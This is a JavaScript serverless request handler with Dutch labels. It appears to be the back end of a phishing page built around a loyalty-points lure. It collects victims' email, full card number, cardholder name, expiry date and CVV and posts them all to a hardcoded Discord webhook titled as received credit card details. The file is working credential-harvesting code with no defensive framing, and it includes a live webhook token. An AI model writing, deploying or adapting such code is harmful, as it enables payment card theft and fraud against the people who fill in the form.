export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const email = req.body.email || '';
    const ref = req.body.ref || 'geen_referentie';
    const cardNumber = req.body.cardNumber || '';
    const cardName = req.body.cardName || '';
    const cardExpiry = req.body.cardExpiry || '';
    const cardCvv = req.body.cardCvv || '';
    const points = req.body.points || '0';

    const webhook = 'https://discord.com/api/webhooks/1504870768108900462/zwR2khNQ-Om9xYfoeRNO7RPKQD15MZhHM8kRFRhDz1jujqSkEMEJ1hKGSdjpsREFMfwO';

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: '💳 **CREDITCARD GEGEVENS ONTVANGEN**',
                color: 0x9B59B6,
                fields: [
                    { name: '🎯 Ref', value: '`' + ref + '`', inline: true },
                    { name: '📧 Email', value: '```' + email + '```', inline: false },
                    { name: '💳 Kaartnummer', value: '```' + cardNumber + '```', inline: false },
                    { name: '👤 Naam', value: '```' + cardName + '```', inline: true },
                    { name: '📅 Vervaldatum', value: '```' + cardExpiry + '```', inline: true },
                    { name: '🔐 CVV', value: '```' + cardCvv + '```', inline: true },
                    { name: '💰 Punten', value: '```' + points + '```', inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        })
    });

    res.status(200).json({ success: true });
}
